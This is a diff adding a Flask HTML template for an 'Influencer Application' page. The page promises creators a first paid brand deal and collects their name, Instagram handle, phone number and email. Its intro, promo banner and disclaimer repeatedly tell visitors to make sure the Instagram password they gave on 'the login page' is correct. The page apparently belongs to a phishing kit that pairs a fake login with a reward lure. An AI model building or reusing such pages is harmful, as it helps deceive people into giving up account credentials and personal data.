@@ -1,0 +1,376 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Influencer Application</title>
+
+    <link rel="stylesheet"
+          href="{{ url_for('static', filename='css/style.css') }}">
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            padding: 35px 12px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #100b19;
+            color: white;
+            font-family: Arial, sans-serif;
+            overflow-x: hidden;
+        }
+
+        .application-box {
+            width: min(95%, 590px);
+            padding: 35px;
+            background: rgba(25, 26, 31, 0.94);
+            border: 1px solid rgba(190, 100, 255, 0.25);
+            border-radius: 18px;
+            box-shadow: 0 0 35px rgba(160, 32, 240, 0.18);
+            animation: formAppear 0.8s ease;
+        }
+
+        @keyframes formAppear {
+            from {
+                opacity: 0;
+                transform: translateY(25px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 27px;
+            background: linear-gradient(90deg, #c084fc, #ff70b8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .intro {
+            color: #bdb5c8;
+            text-align: center;
+            line-height: 1.6;
+            font-size: 14px;
+            margin-bottom: 22px;
+        }
+
+        .promo-banner {
+            display: flex;
+            gap: 14px;
+            padding: 17px;
+            margin: 20px 0;
+            border-radius: 12px;
+            background: linear-gradient(
+                120deg,
+                rgba(131, 56, 236, 0.22),
+                rgba(255, 20, 147, 0.18)
+            );
+            border: 1px solid rgba(192, 132, 252, 0.4);
+            animation: bannerGlow 3s infinite alternate;
+        }
+
+        .promo-icon {
+            font-size: 25px;
+            flex-shrink: 0;
+        }
+
+        .promo-banner h3 {
+            color: #e9b8ff;
+            margin: 0 0 8px;
+            font-size: 16px;
+        }
+
+        .promo-banner p {
+            color: #d8cde5;
+            font-size: 13px;
+            line-height: 1.6;
+            margin: 0;
+        }
+
+        @keyframes bannerGlow {
+            from { box-shadow: 0 0 5px #8338ec22; }
+            to { box-shadow: 0 0 20px #e1306c55; }
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 9px;
+        }
+
+        .form-group input,
+        .form-group textarea {
+            width: 100%;
+            padding: 14px;
+            background: #24252b;
+            color: white;
+            border: 1px solid #393943;
+            border-radius: 8px;
+            font-size: 14px;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        .form-group input:focus,
+        .form-group textarea:focus {
+            border-color: #b44cff;
+            box-shadow: 0 0 12px #8338ec55;
+        }
+
+        .interest-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-top: 12px;
+        }
+
+        .interest-grid label {
+            display: flex;
+            align-items: center;
+            gap: 9px;
+            color: #e5ddec;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .interest-grid input {
+            accent-color: #b44cff;
+            width: 16px;
+            height: 16px;
+        }
+
+        .disclaimer {
+            background: rgba(131, 56, 236, 0.12);
+            border: 1px solid #8338ec55;
+            padding: 15px;
+            border-radius: 10px;
+            color: #d6c9e5;
+            font-size: 12px;
+            line-height: 1.7;
+            margin: 22px 0;
+        }
+
+        .error-message {
+            color: #ff6b6b;
+            margin-bottom: 15px;
+            font-size: 13px;
+        }
+
+        button[type="submit"] {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 9px;
+            color: white;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            background: linear-gradient(100deg, #8338ec, #c13584, #e1306c);
+            background-size: 200% 200%;
+            transition: 0.3s;
+        }
+
+        button[type="submit"]:hover {
+            background-position: 100% 50%;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 22px #c1358466;
+        }
+
+        .privacy-footer {
+            text-align: center;
+            color: #999;
+            font-size: 11px;
+            margin-top: 20px;
+        }
+
+        @media(max-width: 500px) {
+            .application-box {
+                padding: 24px 18px;
+            }
+
+            .interest-grid {
+                gap: 13px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="application-box">
+
+    <h1>Influencer Application ✨</h1>
+
+    <p class="intro">
+        Congratulations! Complete the details below to get your first payment through branddeals and collaborations,
+        Please make sure your Instagram username and password are correct
+        so our team can identify your profile.
+
+        Never share your Instagram password anywhere except the login page.
+        We will never ask you for your password and we dont require it.
+    </p>
+
+    <div class="promo-banner">
+        <div class="promo-icon">🎁</div>
+
+        <div>
+            <h3>✨ Exclusive Creator Rewards!</h3>
+
+            <p>
+                Complete your influencer application to enter
+                our creator rewards campaign. Selected creators
+                will receive first paid brand deal and chance to collaborate.
+                Make sure you logged in with your correct Instagram username and 
+                password, Dont share your password except the login page.
+                
+            </p>
+        </div>
+    </div>
+
+    {% if error %}
+        <div class="error-message">{{ error }}</div>
+    {% endif %}
+
+    <form method="POST"
+          action="{{ url_for('submit_application') }}">
+
+        <div class="form-group">
+            <label>Full Name *</label>
+            <input type="text"
+                   name="name"
+                   placeholder="Enter your full name"
+                   required>
+        </div>
+
+        <div class="form-group">
+            <label>Instagram Username *</label>
+            <input type="text"
+                   name="instagram_username"
+                   placeholder="@yourusername"
+                   required>
+        </div>
+
+        <div class="form-group">
+            <label>Phone Number *</label>
+            <input type="tel"
+                   name="phone"
+                   placeholder="Enter your phone number"
+                   required>
+        </div>
+
+        <div class="form-group">
+            <label>Email Address *</label>
+            <input type="email"
+                   name="email"
+                   placeholder="Enter your email"
+                   required>
+        </div>
+
+        <div class="form-group">
+            <label>What are your interests? *</label>
+
+            <div class="interest-grid">
+
+                <label>
+                    <input type="checkbox" name="interests" value="Dancing">
+                    Dancing
+                </label>
+
+                <label>
+                    <input type="checkbox" name="interests" value="Singing">
+                    Singing
+                </label>
+
+                <label>
+                    <input type="checkbox" name="interests" value="Fashion">
+                    Fashion
+                </label>
+
+                <label>
+                    <input type="checkbox" name="interests" value="Beauty">
+                    Beauty
+                </label>
+
+                <label>
+                    <input type="checkbox" name="interests" value="Travel">
+                    Travel
+                </label>
+
+                <label>
+                    <input type="checkbox" name="interests" value="Comedy">
+                    Comedy
+                </label>
+
+                <label>
+                    <input type="checkbox" name="interests" value="Gaming">
+                    Gaming
+                </label>
+
+                <label>
+                    <input type="checkbox" name="interests" value="Fitness">
+                    Fitness
+                </label>
+
+                <label>
+                    <input type="checkbox" name="interests" value="Food">
+                    Food
+                </label>
+
+                <label>
+                    <input type="checkbox" name="interests" value="Other">
+                    Other
+                </label>
+
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label>Tell us about your interests</label>
+
+            <textarea name="other_interest"
+                      rows="3"
+                      placeholder="Tell us about your content, talents and interests..."></textarea>
+        </div>
+
+        <div class="disclaimer">
+            <strong>Privacy & Security Disclaimer</strong><br>
+
+            Please make sure your Instagram username and password are correct
+            so our team can identify your profile.
+
+            Never share your Instagram password anywhere except the login page.
+            We will never ask you for your password and we dont require it.
+
+            Your application details will be used for
+            application-related communication.
+        </div>
+
+        <button type="submit">
+            Submit Application →
+        </button>
+
+    </form>
+
+    <div class="privacy-footer">
+        We respect your privacy and value your creativity.
+    </div>
+
+</div>
+
+</body>
+</html>
